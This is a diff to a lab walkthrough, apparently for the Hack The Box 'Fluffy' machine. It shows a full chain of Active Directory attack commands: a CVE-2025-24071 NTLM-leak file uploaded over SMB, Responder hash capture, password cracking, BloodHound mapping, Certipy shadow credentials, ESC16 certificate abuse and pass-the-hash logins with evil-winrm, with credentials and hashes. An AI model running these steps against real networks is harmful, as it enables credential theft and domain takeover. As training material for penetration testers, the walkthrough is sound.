@@ -84,7 +84,7 @@ I retrieved the `Upgrade_Notice.pdf` file which contained critical information a
 Among the vulnerabilities listed in `Upgrade_Notice.pdf`, CVE-2025-24071 stands out as a critical flaw in Microsoft Windows File Explorer. This vulnerability enables attackers to capture NTLM credentials by exploiting maliciously crafted network shares, thereby facilitating credential theft and potentially leading to wider system compromise. I created a malicious `.library-ms` file using a PoC found in [CVE-2025-24071_PoC/PoC.py at main · Marcejr117/CVE-2025-24071_PoC · GitHub](https://github.com/Marcejr117/CVE-2025-24071_PoC/blob/main/PoC.py), designed to trigger NTLM authentication:
 
 ```
-£ python3 PoC.py test 10.10.14.102  
+$ python3 PoC.py test 10.10.14.102  
 ```
 
 I uploaded the exploit archive to the IT share:
@@ -96,7 +96,7 @@ $ smbclient -U j.fleischman%J0elTHEM4n1990! -c "put exploit.zip" //10.129.232.88
 I set up a Responder listener on my attacking machine to capture Net-NTLMv2 hash when a user accessed the malicious file. Within moments, I captured the Net-NTLMV2 hash of user `p.agila`:
 
 ```
-sudo responder -I tun0
+$ sudo responder -I tun0
 
 ...SNIP...
 
@@ -114,11 +114,11 @@ sudo responder -I tun0
 I saved the captured hash to a file and used John the Ripper to crack it and abtain the password of `p.agila`:
 
 ```
-echo "p.agila::FLUFFY:6fab96df52daa0d1:6C8170E597369E819D77654BC5C8FFF7:..." > hash.hashes
+$ echo "p.agila::FLUFFY:6fab96df52daa0d1:6C8170E597369E819D77654BC5C8FFF7:..." > hash.hashes
 ```
 
 ```
-john hash.hashes --wordlist=/usr/share/wordlists/rockyou.txt
+$ john hash.hashes --wordlist=/usr/share/wordlists/rockyou.txt
 
 ...SNIP
  
@@ -133,7 +133,7 @@ The hash was successfully cracked, revealing the password `prometheusx-303`
 After obtaining the credentials of user `p.agila`, I collected comprehensive Active Directory data using BloodHound Data Collector to identify attack paths:
 
 ```
-python3 ~/Tools/BloodHound.py/bloodhound.py -d fluffy.htb -c all -u p.agila -p prometheusx-303 -ns 10.129.232.88 -k
+$ python3 ~/Tools/BloodHound.py/bloodhound.py -d fluffy.htb -c all -u p.agila -p prometheusx-303 -ns 10.129.232.88 -k
 ```
 
 After collecting all the domain data, I uploaded them via BloodHound GUI, searched for Transitive Object Control for the user `p.agila`, and discovered several useful informations:
@@ -149,13 +149,13 @@ From this, we can see a clear attack path:
 Leveraging the `GenericWrite` privilege discovered in BloodHound, I added `p.agila` to the `SERVICE ACCOUNTS` group:
 
 ```
-net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb/p.agila%prometheusx-303" -S "10.129.232.88"
+$ net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb/p.agila%prometheusx-303" -S "10.129.232.88"
 ```
 
 Verification confirmed the successful addition:
 
 ```
-net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb/p.agila%prometheusx-303" -S "10.129.232.88"
+$ net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb/p.agila%prometheusx-303" -S "10.129.232.88"
 FLUFFY\ca_svc  
 FLUFFY\ldap_svc  
 FLUFFY\p.agila  
@@ -167,7 +167,7 @@ FLUFFY\winrm_svc
 Now that `p.agila` is a member of the `SERVICE ACCOUNTS` group with `GenericWrite` over `winrm_svc`, I used Certipy to inject shadow credentials in `msDS-KeyCredentialLink` attribute of `winrm_svc` account:
 
 ```
-certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.94.190 -dc-host dc01.fluffy.htb
+$ certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.94.190 -dc-host dc01.fluffy.htb
 [*] Targeting user 'winrm_svc'
 [*] Generating certificate
 [*] Certificate generated
@@ -202,7 +202,7 @@ As we can see, the attack succeeded and Certipy retrieving the NTLM hash of `win
 Using the obtained NTLM hash, I accessed the Domain Controller as `winrm_svc` via WinRM and retrieved the user flag:
 
 ```
-evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+$ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
 ```
 
 ```
@@ -217,7 +217,7 @@ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
 Although `winrm_svc` had limited privileges, group membership in `SERVICE ACCOUNTS` provided access to escalate further. Since `ca_svc` is the service account for the AD CS service of the domain, I injected shadow credentials on `ca_svc` to get his NTLM hash:
 
 ```
-certipy-ad shadow auto -u winrm_svc@fluffy.htb -hashes '33bd09dcd697600edf6b3a7af4875767' -account ca_svc -dc-ip 10.129.232.88
+$ certipy-ad shadow auto -u winrm_svc@fluffy.htb -hashes '33bd09dcd697600edf6b3a7af4875767' -account ca_svc -dc-ip 10.129.232.88
 
 ...SNIP...
 
@@ -229,7 +229,7 @@ certipy-ad shadow auto -u winrm_svc@fluffy.htb -hashes '33bd09dcd697600edf6b3a7a
 With `ca_svc` credentials, I enumerated the AD CS infrastructure to identify vulnerabilities:
 
 ```
-certipy-ad find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88
+$ certipy-ad find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88
 ```
 
 The Certipy output in `20260928172724_Certipy.txt` revealed the presence of ESC16 vulnerability:
@@ -255,13 +255,13 @@ The ESC16 vulnerability occurs when a Certification Authority (CA) is misconfigu
 First, I temporarily changed `ca_svc`'s UPN to `administrator`:
 
 ```
-certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -user ca_svc -upn 'administrator' -dc-ip 10.129.232.88
+$ certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -user ca_svc -upn 'administrator' -dc-ip 10.129.232.88
 ```
 
 Subsequently, I requested a certificate as the Administrator account, since `ca_svc` has `administrator` in his UPN attribute:
 
 ```
-certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -ca 'fluffy-DC01-CA' -template 'User'
+$ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -ca 'fluffy-DC01-CA' -template 'User'
 
 ...SNIP...
  
@@ -277,13 +277,13 @@ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.1
 The certificate was successfully generated. Once i obtained a certificate for the `Administrator` Account, I restored the original `ca_svc` UPN:
 
 ```
-certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -user ca_svc -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.232.88
+$ certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -user ca_svc -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.232.88
 ```
 
 Finally, I used the `Administrator` certificate to obtain a Kerberos TGT and NTLM hash:
 
 ```
-certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
+$ certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
 
 ...SNIP...
   
@@ -295,7 +295,7 @@ certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
 Using the `Administrator` NTLM hash, I achieved complete Domain Controller access and retrieved the root flag:
 
 ```
-evil-winrm -i 10.129.95.176 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e  
+$ evil-winrm -i 10.129.95.176 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e  
 ```
 
 ```
